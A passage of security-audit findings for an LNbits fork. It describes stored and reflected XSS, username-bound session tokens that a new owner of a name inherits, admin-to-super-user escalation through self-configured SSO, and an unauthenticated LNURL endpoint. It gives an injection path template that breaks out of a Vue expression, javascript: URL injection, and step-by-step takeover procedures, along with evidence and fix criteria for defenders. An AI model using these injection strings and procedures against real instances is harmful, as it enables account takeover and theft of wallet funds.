3. [lnbits/templates/pages/wallet.vue:247–255](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/pages/wallet.vue#L247-L255)
   Every logged-in user's wallet page, including the super user's, renders <a :href="ad[0]"> for each ad entry; a javascript: URL executes on click in the LNbits origin.
4. [lnbits/templates/pages/home.vue:160–171](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/pages/home.vue#L160-L171)
   Public home page renders the same <a :href="ad[0]"> ad links.
5. [lnbits/core/views/admin\_api.py:103–149](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L103-L149)
   The settings write path is check_admin only; super-user checks cover lnbits_allow_onchain_payments and the 2FA policy, not theme/ad fields.
6. [lnbits/helpers.py:79](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/helpers.py#L79)
   to_public() output is set as the SETTINGS template global on every template_renderer() call, so the stored value reaches every page immediately.
7. [lnbits/templates/base.html:89](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/base.html#L89)
   SETTINGS is emitted into the page JS context from which g.settings.adSpace is read.
8. [lnbits/core/views/user\_api.py:398–420](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L398-L420)
   PUT /users/api/v1/balance is check_super_user-only and credits any wallet by an arbitrary amount; reachable from the super user's browser session via the injected script, which is the gain the admin position otherwise lacks.
9. [lnbits/core/views/generic.py:78–83](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/generic.py#L78-L83)
   The only Content-Security-Policy header is set on extension-builder preview file responses, not on base.html pages, so javascript: navigation is not blocked.

## Impact
Script running as the super user lets the admin perform the operations the project explicitly withholds from admins (docs/guide/super_user.md 'Admin vs Super User' table): credit the attacker's wallet with arbitrary balance (PUT /users/api/v1/balance), download the full data-folder backup containing auth_secret_key, the TOTP key, the super-user id and the database (GET /admin/api/v1/backup), promote or demote admins, change the funding source, and restart the server. That is full confidentiality and integrity compromise of the instance; availability impact is limited to a restart. Impact on ordinary users is not counted, since admins already reach their wallet keys via the sanctioned user-management API.

## Reproduction steps
1. An authenticated non-super admin PUTs lnbits_ad_space containing a javascript: URL plus lnbits_ad_space_enabled=true through PUT /admin/api/v1/settings (check_admin only; no validator on the field). The banner is rendered as <a :href> on the public home page and on every user's wallet page; the super user must click it (UI:ACTIVE), after which the payload executes in the LNbits origin and issues cookie-authenticated same-origin API calls. No shipped control intervenes: no scheme validation, no CSP on base.html pages, no URL sanitisation in the templates. Explicit dependency assumption: Vue 3.5.44 (package.json pin; static/vendor/vue.global.prod.js) sets v-bind:href verbatim and, per its documented behaviour, does not sanitise URLs; the vendored bundle contains no javascript: filter.

## Recommended fix
1. Admin-configurable ad-space URLs are rendered into href attributes without restricting the scheme, so a non-super admin can store an executable javascript: URL that runs in the super user's session. Fix criteria: Ad-space (and other admin-settable link) URLs must be constrained to http(s) and/or same-origin relative paths at settings validation time and/or at render time, so a javascript:, data: or vbscript: value is rejected or never emitted as href. Verify by setting such a URL via PUT /admin/api/v1/settings and confirming it is rejected or rendered inert on / and /wallet.
2. Pages served from base.html have no Content-Security-Policy, so any injected javascript: URL or inline script executes. Fix criteria: Main pages carry a CSP that disallows javascript: navigation and unexpected inline script sources where compatible with the app's Vue templates.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site Scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** HIGH
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257385

---

# Reflected XSS: request path injected into Vue v-if expression in base.html

## Details
base.html (rendered by every HTML route in generic.py that does not override the page_container block, and by every extension page that extends it) contains at line 70:

    <div v-if="$route.path.startsWith('{{ normalize_path(request.path) }}')">

`request.path` resolves through Jinja's item fallback to scope['path'], the percent-decoded request path (the project relies on this: init-app.js:46 compares RENDERED_ROUTE against $route.path); normalize_path (helpers.py:335-342) only normalises slashes. Jinja autoescaping (starlette Jinja2Templates default) converts `'` to `&#39;`, which is correct for HTML text but not for this context: the browser decodes `&#39;` back to `'` when it parses the attribute, and Vue — created as `Vue.createApp({ el: '#vue' })` (base.html:113) with no template/render option and mounted at init-app.js:265 — takes `container.innerHTML` and compiles the v-if value as a JavaScript expression. A path such as

    /wallet/'),Object.constructor('<js>')(),('

produces the expression `$route.path.startsWith('/wallet/'),Object.constructor('<js>')(),('')`, valid JS. The shipped bundle (lnbits/static/bundle.min.js, Vue 3.5.44) wraps runtime-compiled render code in `with (_ctx) {` and its proxy `has` trap is `"_"!==t[0]&&!Z(t)` with `Object` in the allow-list Z, so `Object` reaches the real global, `Object.constructor` is `Function`, and arbitrary code runs on the LNbits origin.

Reachable entry points in this unit: `/wallet/{wallet_id}` (index; generic.py:186 — wallet_id is never declared or validated so any slash-free string is accepted; requires the victim to be logged in, which is the point), `/admin/extensions/wasm/{ext_id}` (admin victims), `/blockexplorer/{resource_type}/{resource}` (logged-in victims, block explorer enabled) and `/blockexplorer/public/{resource_type}/{resource}` (no authentication when lnbits_blockexplorer_public_api is enabled). Extension pages extending base.html with path parameters are additional entry points outside this unit. The victim's `cookie_access_token` is httponly with samesite=lax (auth_api.py:719-725), so a cross-site top-level GET from a link carries it.

Impact: the page already exposes `window.g.user` = User.json(), which includes every wallet's `adminkey` and `inkey`, and the session cookie authenticates same-origin fetches. Script can therefore read all wallet keys, pay invoices from the victim's wallets, create API tokens, and, if the victim is an admin/super user, call /admin/api/v1/settings to change the funding source or other settings. No CSP is set on core pages. The 404/error page is not affected because error.html overrides page_container; the `const RENDERED_ROUTE = '...'` script line (base.html:88) is not exploitable because entities are not decoded in script data.

This finding records the open ledger lead x-web-01, traced to a conclusion.

Assumptions (dependencies not installed): starlette~=0.48 Jinja2Templates enables autoescape by default and markupsafe escapes `'` as `&#39;`; uvicorn~=0.40 percent-decodes the request target into scope['path']; Jinja2 falls back from getattr(request,'path') to request['path'] (starlette Request exposes scope items via __getitem__). Vue behaviour is verified directly from the shipped bundle, not assumed.

## Evidence
1. [lnbits/templates/base.html:69–73](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/base.html#L69-L73)
   Line 70: v-if="$route.path.startsWith('{{ normalize_path(request.path) }}')" embeds the percent-decoded request path inside a JavaScript expression attribute. Jinja autoescape emits &#39; for a single quote, but the browser decodes character references in attribute values when parsing the page, so Vue later reads a literal quote from container.innerHTML, the string literal is terminated and the rest of the path is compiled as JavaScript.
2. [lnbits/templates/base.html:113–115](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/base.html#L113-L115)
   window.app = Vue.createApp({ el: '#vue' }) supplies neither a template nor a render function, so the full Vue build takes container.innerHTML of #vue (which contains the v-if div) as the in-DOM template to compile at mount time.
3. [lnbits/core/views/generic.py:184–216](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/generic.py#L184-L216)
   index is registered for /wallet/{wallet_id} (any logged-in user) and /admin/extensions/wasm/{ext_id} (admins); wallet_id is never declared or validated, so any slash-free string matches, and the handler renders base.html directly (page_container not overridden), so the vulnerable v-if is emitted. The only gate is check_user_exists, satisfied by the victim's own cookie_access_token (httponly, samesite=lax: auth_api.py:719-725), which is sent on a cross-site top-level GET.
4. [lnbits/core/views/generic.py:236–255](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/generic.py#L236-L255)
   /blockexplorer/{resource_type}/{resource} (any logged-in user when the block explorer is enabled) and /blockexplorer/public/{resource_type}/{resource} (unauthenticated when lnbits_blockexplorer_public_api is enabled) render base.html the same way with attacker-chosen path segments.
5. [lnbits/helpers.py:335–342](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/helpers.py#L335-L342)
   path_segments/normalize_path only strip and re-join slashes; no escaping of quote, parenthesis, comma or operator characters, so the attacker-controlled path reaches the template unchanged. helpers.py:74 registers normalize_path as a Jinja global.
6. [lnbits/static/js/init-app.js:265](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/init-app.js#L265)
   window.app.mount('#vue') triggers runtime compilation. The shipped lnbits/static/bundle.min.js (Vue 3.5.44 full build per package.json) confirms the mechanics: mount sets i.template = a.innerHTML when no render/template is given, generated render code is wrapped in `with (_ctx) {`, and the runtime-compiled proxy's has trap is `"_"!==t[0]&&!Z(t)` where Z is the globals allow-list containing Object — so Object.constructor('<js>')() inside the v-if expression resolves to Function and executes.

## Impact
Script executes on the LNbits origin inside an authenticated session. window.g.user contains the adminkey/inkey of every wallet of the victim; same-origin API calls carry the session cookie, allowing payments out of the victim's wallets, key rotation, API-token creation and, for admin/super-user victims, settings changes (funding source, admin users). Availability is not directly affected.

## Reproduction steps
1. Attacker crafts a link https://<lnbits>/wallet/'),Object.constructor('<payload>')(),(' (or the blockexplorer variants) and gets a logged-in user, admin or super user to open it (email, chat, a page that navigates top-level). The route accepts any slash-free wallet_id, the victim's Lax cookie is sent on the top-level GET, base.html is rendered, the browser decodes &#39;, Vue compiles the attribute and the payload runs in the victim's session on the LNbits origin. No privileges, no non-default configuration, no race.

## Recommended fix
1. A server-side value (the request path) is interpolated into a Vue template expression attribute, where HTML entity escaping does not neutralise JavaScript string delimiters because the browser decodes entities before Vue compiles the expression. Fix criteria: No request-derived value may be interpolated into any Vue directive/expression attribute (v-if, v-bind, :prop, @event, {{ }} inside the in-DOM template). The rendered-route value must reach client code only through a safe channel (e.g. the already-present RENDERED_ROUTE constant emitted with |tojson, or a data attribute read via dataset) and the v-if must reference that JS variable. Verify by requesting /wallet/')%2Calert(1)%2C(' as a logged-in user and confirming no script executes and the page renders.
2. Routes register path parameters (wallet_id, ext_id, resource_type, resource) that are never validated or used, so arbitrary strings reach the template through request.path. Fix criteria: Path parameters on HTML routes are validated against their expected format (e.g. 32-hex wallet ids, allow-listed resource types) and requests that fail validation receive a 404 without rendering the attacker-controlled path into base.html.

---
**Severity:** HIGH
**Status:** Open
**Category:** Cross-site scripting
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257382

---

# Session JWTs resolve the account by mutable username; released names let old tokens hijack new owner

## Details
Session access tokens are bound to a mutable identifier. `_login_response` issues `AccessTokenPayload(sub=account.username, usr=account.id, ...)` and `_get_account_from_jwt_payload` does `if payload.sub: account = get_account_by_username(payload.sub)` before ever looking at `usr`. Usernames can be changed freely by their owner (`PATCH /api/v1/auth`, `PUT /api/v1/auth/password`) and are then available for registration by anyone (`register` only checks current holders; the accounts table has no unique index). Tokens are not re-issued or invalidated on rename and live for `auth_token_expire_minutes` (default one year).

Attack (unprivileged attacker A, victim V):
1. A registers username N and logs in, obtaining token T with `sub=N, usr=A_id, mfa_revision=""`.
2. A renames their account to M via `PATCH /api/v1/auth {user_id, username: "M"}`. N is now free. A keeps T.
3. V later registers (or renames to) N — e.g. in deployments where usernames follow a predictable scheme, or when A squats expected names and releases them.
4. A presents T. `_decode_access_token` succeeds (valid signature, not expired). `get_account_by_username("N")` returns V's account. `check_two_factor_session(V_id, payload)` passes because V's `TwoFactorConfig.revision` is `""` (fresh account) and T's `mfa_revision` is `""`, and 2FA is disabled by default. `_check_user_access` passes. A is now authenticated as V on every endpoint that uses `check_user_exists`, `check_account_exists` or `check_account_id_exists` — listing wallets with keys (`GET /api/v1/auth`, `/api/v1/wallets`), creating invoices and paying from V's wallets, resetting wallet keys, enabling extensions. `update_password` is blocked only by `auth_time` freshness, not needed to drain funds.

A related variant: `update_user_account` checks name uniqueness only among *active* accounts (`get_account_by_username(active_only=True)`), so a user can take a deactivated user's name; if the admin later re-activates the original user, two active accounts share one name and `get_account_by_username` returns the first row for both of their tokens.

Impersonation tokens (`sub=""`, `usr=target`) and API tokens (ACL re-check on the resolved account) are not affected, which shows the id-based resolution already exists; only interactive session tokens pick the name first.

## Evidence
1. [lnbits/decorators.py:559–568](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L559-L568)
   _get_account_from_jwt_payload resolves the principal by payload.sub (username) via get_account_by_username first (line 563); payload.usr (the immutable account id) is consulted only when sub is empty (line 565). Every interactive session token carries both, so the mutable name decides which account the token authenticates.
2. [lnbits/core/views/auth\_api.py:880–881](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L880-L881)
   _login_response takes the id-bound session_payload (sub="", usr=id) and overwrites payload.sub = account.username for all interactive logins (password, usr, nostr, SSO, register, reset), binding the long-lived token (default 525600 minutes, settings.py:942) to the username.
3. [lnbits/core/views/auth\_api.py:589–602](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L589-L602)
   PATCH /api/v1/auth lets the account owner change their username at will (no password, no token re-issue, no revocation), releasing the old name while their existing tokens still carry it in sub.
4. [lnbits/core/views/auth\_api.py:476–477](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L476-L477)
   register only refuses a username currently held by some account (active or not); a name released by rename is free, so a later registrant inherits the attacker's pre-rename token.
5. [lnbits/core/crud/users.py:183–197](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/users.py#L183-L197)
   get_account_by_username matches LOWER(username) among active accounts with no ORDER BY; the accounts table has only non-unique indexes (migrations.py m042) and keeps no name history, so the lookup returns whichever account currently holds the name.
6. [lnbits/core/services/two\_factor.py:342–351](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/two_factor.py#L342-L351)
   check_two_factor_session compares the resolved account's config.revision with the token's mfa_revision; both default to "" (TwoFactorConfig.revision, AccessTokenPayload.mfa_revision) for accounts that never changed password or 2FA, and with 2FA disabled by default (settings.py:991) the check returns at line 351, so the mismatched token passes.
7. [lnbits/core/services/users.py:122–125](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L122-L125)
   update_user_account checks rename uniqueness with get_account_by_username(active_only=True), so a user can take a deactivated account's name; after admin re-activation two active accounts share one name and both sets of tokens resolve to the first row.

## Impact
Full session-level control of the victim account: read wallet admin/invoice keys and payment history, spend the victim's balance, reset keys, change account data. Availability impact limited to what account control allows (e.g. draining funds, disabling extensions).

## Reproduction steps
1. Attacker needs only a self-registered account (registration open by default). Steps are ordinary API calls over the network; no security mechanism must be defeated. Success depends on the victim later taking the released username — a routine registration/rename action by the victim, and a deployment/timing condition the attacker does not control (hence AT:P, UI:P). The token stays valid for a year by default, so the attacker can wait.

## Recommended fix
1. Token-to-account resolution prefers the mutable `sub` (username) over the immutable `usr` (account id), so a token follows the name rather than the account it was issued to. Fix criteria: A session token must resolve only to the account it was issued for: resolve by account id when present and treat `sub` as informational, or embed and verify the id alongside the name. Verify: issue a token, rename the account, register a new account under the old name, and confirm the old token no longer authenticates as the new account.
2. Username uniqueness is enforced only among active accounts and only at write time, allowing deactivated-user name reuse and duplicate active names after re-activation. Fix criteria: Username (and email/pubkey) uniqueness must hold across all accounts regardless of activation state, ideally by a database unique index on a normalised column. Verify: renaming to a deactivated user's name is rejected and concurrent registrations of one name yield one account.

---
**Severity:** HIGH
**Status:** Open
**Category:** Improper authentication
**CWE:** [CWE-706](https://cwe.mitre.org/data/definitions/706.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257379

---

# Settings update API lets a non-super admin take over funding-source selection and obtain a super-user session via self-configured SSO

## Details
PUT and PATCH /admin/api/v1/settings (admin_api.py:103-150, 224-234) are guarded by check_admin only. The sole per-field super-user check is for lnbits_allow_onchain_payments; every other UpdateSettings field is written by update_admin_settings (crud/settings.py:51-61) and applied live by update_cached_settings (services/settings.py:46-59). Two of the writable field groups hand a non-super admin powers the project explicitly reserves to the super user:

1. Funding-source selection. lnbits_backend_wallet_class (settings.py:817) and every FundingSourcesSettings credential are editable. Docs (user_roles.md:36 'Change funding source: Admin ❌', super_user.md:61) and the UI (funding.vue:84 v-if="isSuperUser") reserve this to the super user, but the API does not. set_funding_source (wallets/__init__.py:38-44) instantiates whatever class name is stored, without checking the read-only lnbits_allowed_funding_sources, at the next process start (app.py:113). An admin can therefore point the instance at LNbitsWallet/an attacker-controlled endpoint (the attacker's backend then issues all invoices and decides what is 'paid', and receives inbound funds), at FakeWallet, or at VoidWallet; the change becomes effective at the operator's next routine restart (the admin cannot restart from the UI — that is check_super_user, admin_api.py:260-267). Funding fields are also RESET_PRESERVED, so a settings reset does not undo it.

2. A super-user session via self-configured SSO. The admin PUTs auth_allowed_methods including 'oidc-auth' (or 'keycloak-auth') and oidc_discovery_url/oidc_client_id/oidc_client_secret pointing at an IdP they run; _new_sso (auth_api.py:750-780) builds the client from these live settings on every request and OidcSSO.get_discovery_document (models/sso/oidc.py:30-36) fetches token/userinfo endpoints from the attacker's discovery URL. Completing GET /api/v1/auth/oidc/token (auth_api.py:426-445) hands the IdP-asserted userinfo to _handle_sso_login (661-686), which looks the account up by email (get_account_by_email, active_only=False) and calls _login_response for it with no provider or role restriction. If the super user account has an email (set by the super user via the users admin API), the attacker's IdP asserts that email and receives a super-user session. If 2FA is enabled, the admin first PUTs lnbits_two_factor_enabled=false: validate_two_factor_policy (two_factor.py:374-405) only requires the acting admin's own recent interactive login, and _login_response (auth_api.py:857) and check_two_factor_session read the flag live. The super-user session unlocks the powers the project withholds from admins: credit/debit any wallet (user_api.py:398-404 — unbacked sats spendable against the funding source), restart (which also activates the funding-source switch above), data-folder backup containing .lnbits_auth_key (mint any JWT indefinitely), onchain key and settings reset. The same path also logs the admin into any other admin's account, which impersonation (auth_api.py:212-216) forbids.

Conceded by design and not counted as gain: admins managing lnbits_admin_users/lnbits_allowed_users (user_roles.md:38 'Manage Admins & Users ✅' for Admin, users.vue ungated), the global 2FA policy (two-factor-authentication.md describes 'the acting admin'), and SSO configuration itself (security.vue shows auth_allowed_methods and oidc_* to every admin). The threat model's established facts already record that every EditableSettings field is admin-writable; this finding is the admin→super-user and admin→funding-source boundary breach that writability enables, which the threat model names as the boundary.

## Evidence
1. [lnbits/core/views/admin\_api.py:103–149](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L103-L149)
   api_update_settings is guarded only by check_admin; the sole per-field super-user check is for lnbits_allow_onchain_payments (113-121). Every other UpdateSettings field — including lnbits_backend_wallet_class, funding credentials, auth_allowed_methods and oidc_* — is persisted (133) and applied live (137).
2. [lnbits/core/views/admin\_api.py:224–234](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L224-L234)
   PATCH variant merges an arbitrary dict into the current settings and calls the same handler with the same missing per-field authorization.
3. [lnbits/core/crud/settings.py:51–61](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/settings.py#L51-L61)
   update_admin_settings writes every set field of the submitted model to system_settings; no field-level authorization filter exists anywhere between the route and the DB.
4. [lnbits/core/services/settings.py:46–59](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/settings.py#L46-L59)
   update_cached_settings applies submitted values to the live settings object immediately; only ReadOnlySettings fields are skipped, and none of the funding/auth fields are read-only.
5. [lnbits/settings.py:1096–1122](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1096-L1122)
   EditableSettings (hence UpdateSettings) includes FundingSourcesSettings, AuthSettings, KeycloakAuthSettings, OidcAuthSettings and TwoFactorSettings; nothing marks any field super-user-only.
6. [lnbits/settings.py:817](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L817)
   lnbits_backend_wallet_class, the field selecting which funding backend is instantiated, is an editable field.
7. [lnbits/wallets/\_\_init\_\_.py:38–44](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/__init__.py#L38-L44)
   set_funding_source instantiates getattr(wallets_module, settings.lnbits_backend_wallet_class) with no check against the read-only lnbits_allowed_funding_sources list.
8. [lnbits/app.py:112–116](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L112-L116)
   The stored class name is bound at process start; an admin-written lnbits_backend_wallet_class plus credentials becomes the money source of truth at the operator's next (routine) restart.
9. [lnbits/core/views/admin\_api.py:260–267](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L260-L267)
   Restart is check_super_user: the project treats funding-source activation as a super-user act, but the selection itself is not protected.
10. [lnbits/core/views/auth\_api.py:750–779](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L750-L779)
   _new_sso builds the SSO client on every request from live settings: auth_allowed_methods, <provider>_client_id/_client_secret and <provider>_discovery_url, all of which the admin just wrote.
11. [lnbits/core/models/sso/oidc.py:30–36](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/sso/oidc.py#L30-L36)
   OidcSSO fetches the discovery document from the admin-supplied discovery_url, so token and userinfo endpoints are whatever the attacker's IdP advertises.
12. [lnbits/core/views/auth\_api.py:426–445](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L426-L445)
   The OAuth callback verifies the code against the attacker-configured provider and passes the IdP-asserted userinfo to _handle_sso_login with no provider/role restriction.
13. [lnbits/core/views/auth\_api.py:661–700](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L661-L700)
   _handle_sso_login resolves the account by the asserted email (get_account_by_email, active_only=False) and calls _login_response for it; an attacker IdP asserting the super user's email yields a super-user session.
14. [lnbits/core/views/auth\_api.py:855–860](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L855-L860)
   2FA on login is gated by settings.lnbits_two_factor_enabled read live; the admin can switch it off through the same settings route before the SSO login.
15. [lnbits/core/services/two\_factor.py:374–405](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/two_factor.py#L374-L405)
   validate_two_factor_policy only requires the acting admin's own recent interactive login to disable 2FA instance-wide; extra checks apply only when enabling.
16. [lnbits/core/views/user\_api.py:398–404](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L398-L404)
   Credit/debit of any wallet is check_super_user — one of the powers the super-user session obtained via SSO unlocks (unbacked sats spendable against the funding source).
17. [lnbits/templates/components/admin/funding.vue:84–89](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/templates/components/admin/funding.vue#L84-L89)
   The UI hides the funding-source editor from non-super admins (v-if="isSuperUser"); the API does not mirror this.
18. [docs/guide/user\_roles.md:34–40](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docs/guide/user_roles.md#L34-L40)
   Documented role table: 'Change funding source' Super User ✅, Admin ❌.
19. [docs/guide/super\_user.md:56–68](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docs/guide/super_user.md#L56-L68)
   Admin vs Super User table reserves funding source, credit/debit and restart to the super user.

## Impact
Integrity: control of funding-backend selection and credentials (the money source of truth) and, via the super-user session, credit/debit of any wallet, restart and settings reset. Confidentiality: the super-user session can download the data-folder backup (SQLite DB, .lnbits_auth_key, .lnbits_totp_key, onchain key), exposing every wallet key and the JWT signing secret. Availability: switching the backend to VoidWallet/FakeWallet disables or corrupts payments for every user.

## Reproduction steps
1. Attacker is an authenticated non-super admin (lnbits_admin_users) with a password, reachable over the network. Path 1 (funding source): one PUT with lnbits_backend_wallet_class plus credentials succeeds against the default configuration and takes effect at the operator's next restart — a condition outside the attacker's control. Path 2 (super-user session): PUT auth_allowed_methods + oidc_* (+ lnbits_two_factor_enabled=false after a fresh login), then complete /api/v1/auth/oidc against the attacker's IdP asserting the super user's email; this requires the super user account to have an email set, again a victim-state condition the attacker does not control. No shipped control must be defeated on either path, hence AC:L with AT:P.

## Recommended fix
1. api_update_settings authorises the request as a whole with check_admin and has no per-field policy; funding-source selection and credentials, and the authentication-provider configuration that can mint sessions for any account, are writable by every admin although the design reserves funding control and super-user powers to the super user. Fix criteria: A non-super admin's PUT/PATCH that changes lnbits_backend_wallet_class, any FundingSourcesSettings credential, auth_allowed_methods or any SSO provider client/discovery setting is rejected (403) and leaves DB and live settings unchanged; the super-user-only field set is declared once and enforced identically for PUT and PATCH. Verify by replaying the described requests as a plain admin.
2. set_funding_source trusts the stored class name and ignores lnbits_allowed_funding_sources. Fix criteria: Only class names in lnbits_allowed_funding_sources may be instantiated as the funding source; an unknown or disallowed name falls back to VoidWallet with a logged error.
3. _handle_sso_login binds an IdP-asserted email to any existing account, including admin and super-user accounts, so whoever controls the SSO configuration controls those sessions. Fix criteria: SSO login must not log into the super user or admin accounts unless the account was explicitly linked to that provider by its owner (or SSO for privileged accounts is disabled); asserting a privileged account's email through a newly configured provider yields no session for it.

---
**Severity:** HIGH
**Status:** Open
**Category:** Missing Authorization
**CWE:** [CWE-862](https://cwe.mitre.org/data/definitions/862.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** HIGH
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257377

---

# Unauthenticated pay-with-nfc endpoint drives server-side LNURL-withdraw requests to attacker-chosen hosts

## Details
`api_payment_pay_with_nfc` (lnbits/core/views/payment_api.py:529) is mounted under `/api/v1/payments/{payment_request}/pay-with-nfc` with no authentication dependency, although the first-party wallet UI (`payInvoiceWithNfc`, wallet.js:887) sends the wallet admin key with it and every sibling route that drives LNbits' LNURL client (`/api/v1/lnurlscan` GET/POST, `/api/v1/lnurlauth`, `/api/v1/payments/lnurl` in lnurl_api.py) is gated by `require_base_invoice_key` or `require_admin_key`. The project's own test (tests/api/test_api.py:1213) calls it with no key. Any anonymous network client can POST `{"lnurl_w": "lnurlw://<host>[:port]/<path>?<query>"}` with any bolt11 string as `payment_request`.

